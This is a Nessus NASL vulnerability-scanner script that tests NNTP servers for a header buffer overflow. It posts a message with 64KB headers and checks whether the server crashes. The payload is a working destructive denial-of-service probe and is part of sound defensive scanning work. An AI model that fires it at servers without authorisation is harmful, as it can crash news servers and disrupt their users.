#
# This script was written by Michel Arboi <mikhail@nessus.org>
#
# It is released under the GNU Public Licence 
#
# Overflow on the user name is tested by cassandra_nntp_dos.nasl
# 
# NNTP protocol is defined by RFC 977
# NNTP message format is defined by RFC 1036 (obsoletes 850); see also RFC 822.

if(description)
{
 script_id(17228);
 script_version ("$Revision");
 name["english"] = "NNTP message headers overflow";
 
 script_name(english:name["english"]);
 desc["english"] = "
Nessus was able to crash the remote NNTP server by sending
a message with long headers. 
This flaw is probably a buffer overflow and might be exploitable
to run arbitrary code on this machine.

Solution : apply the latest patches from your vendor or
	 use a safer software.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Sends a message with long headers to nntpd";
 
 script_summary(english:summary["english"]);
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005 Michel Arboi");

 family["english"] = "Gain a shell remotely";
 script_family(english:family["english"]);
 script_dependencie("find_service_3digits.nasl", "nntp_info.nasl");
 script_require_ports("Services/nntp", 119);
 exit(0);
}

#
include('global_settings.inc');
include('nntp_func.inc');

# This script might kill other servers if the message is propagated
if (! experimental_scripts) exit(0);

port = get_kb_item("Services/nntp");
if(!port) port = 119;
if(! get_port_state(port)) exit(0);

user = get_kb_item("nntp/login");
pass = get_kb_item("nntp/password");

ready = get_kb_item("nntp/"+port+"/ready");
if (! ready) exit(0);

noauth = get_kb_item("nntp/"+port+"/noauth");
posting = get_kb_item("nntp/"+port+"/posting");

if (! noauth && (! user || ! pass)) exit(0);
if (! posting) exit(0);

s = nntp_connect(port: port, username: user, password: pass);
if(! s) exit(0);

len = 65536;

msg = strcat('Newsgroups: ', crap(len), '\r\n',
	'Subject: ', crap(len), '\r\n',
	'From: Nessus <', crap(len), '@example.com>\r\n',
	'Message-ID: <', crap(len), '@', crap(len), rand(), '.NESSUS>\r\n',
	'Lines: ', crap(data: '1234', length: len), '\r\n',
	'Distribution: local\r\n',	# To limit risks
	'\r\n',
	'Test message (post). Please ignore.\r\n',
	'.\r\n');

nntp_post(socket: s, message: msg);
close(s);
sleep(1);

s = open_sock_tcp(port);
if(! s) 
{
  security_hole(port);
  exit(0);
}
else
 close(s);

